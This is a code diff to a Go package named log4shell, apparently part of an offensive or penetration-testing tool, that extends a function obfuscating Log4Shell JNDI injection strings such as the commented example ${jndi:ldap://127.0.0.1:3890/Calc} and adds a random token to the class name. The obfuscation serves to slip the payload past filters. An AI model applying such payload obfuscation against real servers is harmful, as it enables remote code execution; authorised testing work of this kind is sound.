@@ -1,6 +1,7 @@
 package log4shell
 
 import (
+	"fmt"
 	"math/rand"
 	"strings"
 )
@@ -21,11 +22,25 @@ var skippedChars = map[byte]struct{}{
 
 // Obfuscate is used to obfuscate malicious(payload) string
 // like ${jndi:ldap://127.0.0.1:3890/Calc} for log4j2 package.
-func Obfuscate(raw string) string {
+// Return value are obfuscated string and raw with token.
+func Obfuscate(raw string, token bool) (string, string) {
 	l := len(raw)
 	if l == 0 {
-		return ""
+		return "", ""
 	}
+
+	// add token to the end of class name
+	var rwt string // raw with token
+	if token {
+		front := raw[:len(raw)-1]
+		token := randString(16)
+		last := string(raw[len(raw)-1])
+		raw = fmt.Sprintf("%s_%s%s", front, token, last)
+
+		rwt = raw
+		l = len(raw)
+	}
+
 	obfuscated := strings.Builder{}
 
 	remaining := l
@@ -54,8 +69,8 @@ func Obfuscate(raw string) string {
 			}
 		}
 
+		// obfuscate or not
 		if skip || (!randBool() && lastObfuscated) {
-			// not obfuscate
 			obfuscated.WriteString(section)
 
 			remaining -= size
@@ -94,5 +109,5 @@ func Obfuscate(raw string) string {
 		lastObfuscated = true
 	}
 
-	return obfuscated.String()
+	return obfuscated.String(), rwt
 }
